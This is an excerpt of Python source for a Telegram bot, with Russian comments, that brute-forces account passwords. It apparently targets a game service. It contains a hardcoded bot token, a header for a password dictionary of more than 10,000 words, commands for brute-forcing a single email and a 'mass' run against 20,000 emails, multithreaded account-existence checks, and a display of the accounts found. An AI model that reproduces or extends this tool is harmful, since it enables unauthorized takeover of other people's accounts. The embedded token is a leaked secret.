...
# ================== КОНФИГУРАЦИЯ ==================
BOT_TOKEN = "8874004875:AAEslk0sxxDKXNnWtvggCc3RKUTJB4NwV14"  # вставьте сюда свой токен
bot = telebot.TeleBot(BOT_TOKEN)

# ================== РАСШИРЕННЫЙ СЛОВАРЬ ПАРОЛЕЙ (10 000+) ==================
BASE_WORDS = [
...
def handle_callback(call):
    if call.data == "bruteforce":
        bot.answer_callback_query(call.id, "Введите email через /bruteforce email")
        bot.send_message(call.message.chat.id, "📧 Пример: /bruteforce player@example.com")
    elif call.data == "auto_mass":
        bot.answer_callback_query(call.id, "Запускаем массовый подбор...")
        bot.send_message(call.message.chat.id, "⚡ Запускаю массовый подбор (20 000 email)...")
        cmd_auto_mass(call.message)  # вызов функции напрямую
    elif call.data == "show_found":
        bot.answer_callback_query(call.id, "Загружаю найденные аккаунты...")
        cmd_show_found(call.message)
    elif call.data == "stop":
        bot.answer_callback_query(call.id, "Остановка (в разработке)")
...
def cmd_auto_mass(message):
    ...
    # Многопоточная проверка с прогрессом
    def check_worker(email):
        if check_account_exists(email):
            with lock:
                existing.append(email)
        return True  # для подсчёта
...
# ================== ДОПОЛНИТЕЛЬНО: получение file_id для фото ==================
